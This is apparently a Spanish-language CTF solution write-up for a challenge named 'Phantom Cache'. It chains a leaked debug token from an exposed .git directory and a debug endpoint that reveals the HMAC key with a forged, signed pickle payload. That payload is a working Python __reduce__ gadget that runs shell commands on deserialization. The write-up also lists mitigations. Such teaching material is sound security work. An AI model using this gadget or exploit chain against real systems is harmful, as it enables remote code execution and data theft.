# Solución — pwn-pickle-03 · Phantom Cache

**Categoría:** pwn · **Dificultad:** insane · **Puntos:** 700 ·
**Vuln central:** deserialización insegura de **pickle** (RCE) encadenada con una
**fuga de la clave HMAC** de firma.

## Historia

*Phantom Cache* es el store de sesiones SSO distribuido de una corp ficticia.
Para evitar estado en el servidor, los arquitectos tomaron un atajo clásico y
peligroso: **el token de sesión que recibe cada cliente ES su propio estado de
sesión serializado** — `base64(zlib(pickle(obj)))` — con un HMAC-SHA256 pegado
detrás (`<payload_b64>.<hexsig>`). En cada petición el servicio **verifica la
firma y luego hace `pickle.loads()`** para "rehidratar" la sesión.

El equipo creía estar a salvo: "está firmado, nadie puede tocar el contenido".
Es el malentendido de fondo — el HMAC da **integridad**, no impide que el
contenido sea un **gadget de `pickle`**. Y `pickle.loads()` sobre datos que un
atacante puede llegar a firmar es, literalmente, **ejecución remota de código**
(`__reduce__` corre en deserialización). La regla de oro que se rompió:
*nunca hagas `pickle.loads()` de datos que no controlas tú al 100%* — ver la
nota roja en la doc oficial de `pickle`.

El único muro era no conocer la clave de firma. Pero el repo del servicio quedó
con el directorio `.git/` expuesto, y un commit que "removía" el token de debug
del código lo dejó plano en el historial. Con ese token, un endpoint de debug
heredado escupe la `SIGNING_KEY`. A partir de ahí, el atacante firma su propio
pickle malicioso y el servidor lo ejecuta sin rechistar.

## Cadena de explotación (INSANE — 3 eslabones)

| # | Eslabón | Dónde | Efecto |
|---|---------|-------|--------|
| 1 | `.git` expuesto + endpoint debug | `GET /.git/logs/HEAD` → `GET /debug/config` | Filtra `DEBUG_TOKEN`, luego `SIGNING_KEY` |
| 2 | Forja de pickle firmado | lado atacante | `pickle` con `__reduce__` + HMAC válido |
| 3 | Deserialización insegura | `POST /cache/restore` | `pickle.loads()` → RCE → flag |

### Eslabón 1 — fuga de la clave HMAC

```
GET /.git/logs/HEAD
  -> "...chore: drop hardcoded debug token (was X-Debug-Token: dbg_XXXX) ..."

GET /debug/config      (header  X-Debug-Token: dbg_XXXX)
  -> {"signing_key":"<SIGNING_KEY>", "session_format":"base64(zlib(pickle)).hmac_sha256", ...}
```

El historial `.git` "olvidó" el token de debug en el mensaje del commit. El
endpoint de debug se "protege" solo con ese token; al pasarlo, devuelve la
config interna **incluida la clave de firma**.

### Eslabón 2 — forjar un pickle firmado

```python
class RCE:
    def __init__(self, cmd): self.cmd = cmd
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (self.cmd,))   # corre al deserializar

raw         = pickle.dumps(RCE(["sh","-c","cat /flag.txt || printenv FLAG"]))
payload_b64 = base64.b64encode(zlib.compress(raw))
sig         = hmac.new(SIGNING_KEY, payload_b64, hashlib.sha256).hexdigest()
token       = payload_b64.decode() + "." + sig
```

Devolver la salida del comando como **valor deserializado** hace que el endpoint
la refleje en la respuesta → exfil directa, sin RCE ciego.

### Eslabón 3 — disparar la RCE

```
POST /cache/restore
Content-Type: application/json
{"token": "<token forjado>"}

  -> el server verifica el HMAC (cuadra), hace pickle.loads(),
     ejecuta el gadget, y refleja la salida:
  {"status":"ok","session":"flag{...}\n"}
```

Exploit completo (los 3 eslabones automatizados):

```
python solution/exploit.py http://<host>:8080
# opcional: ejecutar un comando arbitrario para demostrar RCE genérica:
python solution/exploit.py http://<host>:8080 id
```

Verificado localmente de extremo a extremo: el script fuga `DEBUG_TOKEN`,
obtiene `SIGNING_KEY`, forja el pickle firmado, y `/cache/restore` devuelve la
flag tras ejecutar el gadget.

## Por qué es INSANE

- **No basta una sola vuln.** La deserialización insegura por sí sola no es
  explotable: el HMAC bloquea cualquier payload no firmado. Hay que **encadenar**
  recon (`.git` leak) → bypass del debug → exfil de la clave → forja → RCE.
- La firma es HMAC-SHA256 con clave aleatoria por instancia: **romperla a fuerza
  bruta es inviable**. El truco es entender que la clave se *filtra* por otra
  vía, no se rompe.
- Requiere construir un **gadget `__reduce__`** real y empaquetarlo en el formato
  exacto del token (`base64(zlib(pickle)).hmac`).

## Mitigaciones (didáctico)

- **Nunca** `pickle.loads()` sobre datos influenciables por el cliente. Usar un
  formato de datos sin ejecución (JSON) o sesiones server-side con un ID opaco.
- Si hay que serializar estado en el cliente, firmar **y** usar un formato
  inerte; el HMAC nunca convierte a `pickle` en seguro.
- No exponer `.git/` (regla en el reverse proxy: denegar `^/\.git`). No dejar
  secretos en mensajes/historial de commits; rotar al detectar fuga.
- Eliminar endpoints de debug en prod; no protegerlos con un token estático
  embebido.

## Nota anti-cheat

La flag es **dinámica y única por equipo** (HMAC del flag-service,
`ARCHITECTURE §4`), inyectada por env `FLAG` en esta instancia (también escrita
a `/flag.txt` al arrancar para que un RCE genérico `cat /flag.txt` la halle).
La flag **solo** llega por env: no está hardcodeada ni en la imagen.

Compartir el método no da puntos: cada equipo explota **su propia** instancia
para **su** flag. Enviar la flag de otro equipo dispara `cheat_flag_share`
(`/whose-flag`). Además, cada eslabón emite eventos SIEM al collector:
`git-exposed` y `debug-endpoint` (warn/alert), y la deserialización en
`/cache/restore` emite `pickle-restore` (alert) — el SIEM del stream ve toda la
cadena. La `SIGNING_KEY` y el `DEBUG_TOKEN` son aleatorios por instancia, así que
los valores de un equipo no sirven en la instancia de otro.
